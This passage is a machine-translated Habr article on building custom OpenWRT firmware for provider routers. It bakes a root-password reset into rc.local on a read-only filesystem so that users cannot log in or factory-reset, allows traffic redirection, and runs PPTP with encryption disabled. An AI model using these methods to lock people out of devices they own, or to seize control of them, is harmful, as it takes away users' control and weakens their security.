Secara umum, kita dapat sepenuhnya mengarahkan lalu lintas. </font><font style="vertical-align: inherit;">Anda juga dapat menginstal paket pada sistem file ftp yang terpasang, untuk ini kami menggunakan </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">opkg â€“dest</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , setelah menentukan nama dan alamat untuk sistem file kami di </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/opkg.conf</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Sisa konfigurasi juga harus didaftarkan sebelumnya dalam file yang sesuai.</font></font><br>
<pre><code class="bash hljs">/etc/firewall.user<font></font>
/etc/config/firewall<font></font>
/etc/config/network<font></font>
/etc/config/system<font></font>
/etc/config/wireless<font></font>
/etc/rc.local<font></font>
 .<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semua file ini harus disiapkan terlebih dahulu untuk menanamkannya di firmware. </font><font style="vertical-align: inherit;">Sebenarnya, apa yang ini memberi kita selain fitur tambahan? </font><font style="vertical-align: inherit;">Tetapi kenyataannya adalah bahwa sistem file squashfs bersifat read-only. </font><font style="vertical-align: inherit;">Dengan demikian, pengguna tidak akan dapat mengubah pengaturan default yang saya atur dengan cara apa pun. </font><font style="vertical-align: inherit;">Dengan seluruh kemauannya, bahkan melalui telnet, ia tidak akan dapat terhubung, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">karena</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> di </font><i><font style="vertical-align: inherit;">rc.local</font></i><font style="vertical-align: inherit;"> , yang dijahit ke dalam firmware, ada garis</font></font><br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> â€“e â€œpass\npassâ€ | passwd root
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Artinya, akses melalui telnet terpotong segera setelah router dimuat, dan hanya saya yang memiliki kata sandi SSH. </font><font style="vertical-align: inherit;">Menyetel ulang ke default dengan tombol fisik juga akan gagal di sini, karena defaultnya diatur oleh saya dan dijahit ke dalam firmware. </font><font style="vertical-align: inherit;">Tujuan tercapai.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sehubungan dengan transfer semua pengguna ke IPoE dalam beberapa waktu terakhir dan ditinggalkannya VPN, semuanya berada di belakang NAT, termasuk router tempat saya memiliki VPN untuk akses ke jaringan internal penyedia. Selain mereka yang telah mengaktifkan layanan "IP Statis", tentu saja. Tetapi ada masalah: mereka yang menginginkan IP asli masih harus menggunakan VPN untuk mengakses Internet. Saya harus menyiksa diri sendiri dan membangun OpenWRT dengan klien PPTP berkabel dan terkonfigurasi (dan itu bekerja untuk beberapa alasan benar-benar miring), serta server OpenVPN berkabel dan dikonfigurasi. Banyak router mati selama percobaan, tetapi hasilnya akhirnya tercapai. Setelah menuangkan firmware tersebut ke beberapa router (dari beberapa yang tersisa dengan IP asli), saya memiliki akses yang stabil ke jaringan internal menggunakan OpenVPN.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Masalah dengan menghubungkan PPTP VPN adalah bahwa server penyedia tidak mendukung enkripsi. </font><font style="vertical-align: inherit;">Ini diperbaiki dengan menambahkan baris ke </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/ppp/options.pptp</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">nomppe
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika tidak, proses pengaturan klien PPTP VPN dan server OpenVPN tidak berbeda dengan manual OpenWRT. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya harap artikel ini akan menarik bagi seseorang, dan seseorang akan belajar sesuatu yang baru darinya. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UPD:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Seperti yang ditulis </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ValdikSS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dalam komentar </font><font style="vertical-align: inherit;">, alih-alih curlftpfs + tinyproxy, Anda dapat menggunakan OpenSSH, yang lebih fungsional.</font></font></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id381573/">https://habr.com/ru/post/id381573/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id381559/index.html">Ultrabook anti-krisis: murah dan ceria</a></li>
<li><a href="../id381563/index.html">Bagaimana inovasi teknologi akan mengubah kehidupan sehari-hari</a></li>
<li><a href="../id381565/index.html">Pengukur energi atau cara mengukur efisiensi outlet</a></li>
<li><a href="../id381567/index.html">Twitter telah menghapus iklan yang dapat menyebabkan kejang epilepsi</a></li>
<li><a href="../id381569/index.html">Petunjuk Perakitan Printer 3D Prism Uni 3D (Bagian 2-Listrik)</a></li>
<li><a href="../id381575/index.html">Pria itu naik ke panggung Broadway untuk mengisi daya smartphone-nya. "Bulan purnama atau si idiot?"</a></li>
<li><a href="../id381577/index.html">Robot kerja</a></li>
<li><a href="../id381581/index.html">Sepuluh server teratas dan pembaruan 2015</a></li>
<li><a href="../id381583/index.html">Sepotong adonan</a></li>
<li><a href="../id381585/index.html">Mobil Honda mencetak rekor dunia untuk konsumsi bahan bakar: 2,4 liter per 100 km</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>